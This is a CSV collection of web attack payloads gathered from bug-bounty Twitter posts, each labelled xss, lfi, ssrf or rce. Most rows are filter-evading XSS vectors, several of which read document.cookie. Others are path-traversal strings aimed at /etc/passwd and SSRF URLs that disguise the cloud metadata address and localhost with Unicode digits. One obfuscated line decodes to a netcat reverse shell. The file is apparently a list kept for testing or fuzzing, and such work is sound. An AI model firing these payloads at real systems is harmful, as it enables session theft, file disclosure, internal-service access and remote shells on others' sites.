https://twitter.com/startupmonit0r/status/1318031720336232455,javascript:%ef%bb%bfalert(XSS),xss
https://twitter.com/hunter0x7/status/1316360918029262854,%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,xss
https://twitter.com/hunter0x7/status/1316360918029262854,%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd,lfi
https://twitter.com/hunter0x7/status/1316360918029262854,../../etc/passwd,lfi
https://twitter.com/hunter0x7/status/1316360918029262854,"<svG/x="">""/oNloaD=confirm()//",xss
https://twitter.com/hunter0x7/status/1316086759197900801,http://⑯⑨。②⑤④。⑯⑨｡②⑤④/,ssrf
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/,ssrf
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/,ssrf
https://twitter.com/hunter0x7/status/1316086759197900801,http://②⑧⑤②⓪③⑨①⑥⑥:80/,ssrf
https://twitter.com/hunter0x7/status/1316086759197900801,http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/,ssrf
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥,ssrf
https://twitter.com/bugbountynights/status/1313736316933361666,alert?.(document?.cookie),xss
https://twitter.com/XssPayloads/status/1313343975181504512,<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!,xss
https://twitter.com/Bc10ver,"<input accesskey=X onclick=""self['wind'+'ow']['one'+'rror']=alert;throw 1337;"">",xss
https://twitter.com/Bc10ver/status/1311076328578469889,<lol/onauxclick=[0].some(alert)>rightclickhere,xss
https://twitter.com/ShawarkOFFICIAL/status/1310885148381057026,"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",xss
https://twitter.com/_Y000_/status/1310693935325437952,marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>,xss
https://twitter.com/3XS0/status/1310400407206850560,"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>",xss
https://twitter.com/3XS0/status/1310398146443382784,"<svg onload=""[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()"">",xss
https://twitter.com/3XS0/status/1310398146443382784,<svg onload=&#97&#108&#101&#114&#116(1)>,xss
https://twitter.com/_Y000_/status/1309030446039273472,"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>",xss
https://twitter.com/su13ym4n/status/1308696263869825024,$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),rce
https://twitter.com/3XS0/status/1304506926911434758,<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>,xss
https://twitter.com/infosecsanyam/status/1301416231157850112,"Function(""\x61\x6c\x65\x72\x74\x28\x31\x29"")();",xss
https://twitter.com/_Y000_/status/1300943712361611265,"<svg onload=alert("""")>",xss
https://twitter.com/_Y000_/status/1300943712361611265,"<svg onload=alert%26%230000000040"""")>",xss
https://twitter.com/hacktivist1337/status/1300172069125140480,<svg onx=() onload=(confirm)(1)>,xss
https://twitter.com/XssPayloads/status/1298876497776828416,<object/data=javascript:alert()>,xss
https://twitter.com/XssPayloads/status/1298876497776828416,"<a/href=""javascript%0A%0D:alert()"">",xss
https://twitter.com/_Y000_/status/1298647040440770560,"-(a=alert,b=""_Y000!_"",[b].find(a))-'",xss
https://twitter.com/_Y000_/status/1298647040440770560,-alert(1)-',xss
https://twitter.com/WeAreOnSecurity/status/1298331478095536133,<marquee loop=1 onfinish=alert( )>x,xss
https://twitter.com/brodie_codie/status/1298030134948241410,Javascript://%E2%80%A9alert(618),xss
https://twitter.com/Secburo/status/1291700561352503296,"~2; ""%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E""",xss
https://twitter.com/CharuDutt8/status/1289597837337010176,for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7,xss
